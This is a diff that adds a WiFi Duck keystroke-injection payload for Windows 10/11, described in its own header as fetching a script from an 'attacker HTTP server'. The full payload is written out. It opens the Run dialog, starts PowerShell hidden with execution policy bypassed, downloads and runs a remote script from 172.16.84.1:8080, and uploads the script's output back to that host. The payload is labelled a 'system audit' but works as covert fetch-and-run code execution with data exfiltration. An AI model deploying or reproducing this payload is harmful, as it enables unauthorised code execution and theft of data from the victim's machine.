@@ -1,0 +1,15 @@
+// WiFi Duck Payload — Windows System Audit
+// Description: Opens PowerShell and runs SysAudit.ps1 from attacker HTTP
+//              server. Results uploaded back. No UAC required — runs as
+//              current user for non-admin audit.
+// Target: Windows 10/11
+// Author: <operator>
+
+delay 2000
+
+gui r
+delay 500
+
+string powershell -W Hidden -NoP -NonI -Exec Bypass -C "iwr http://172.16.84.1:8080/SysAudit.ps1 -OutFile $env:TEMP\sa.ps1; & $env:TEMP\sa.ps1 | Out-File $env:TEMP\sa_out.txt; iwr -Method POST -InFile $env:TEMP\sa_out.txt http://172.16.84.1:8080/upload"
+delay 200
+enter
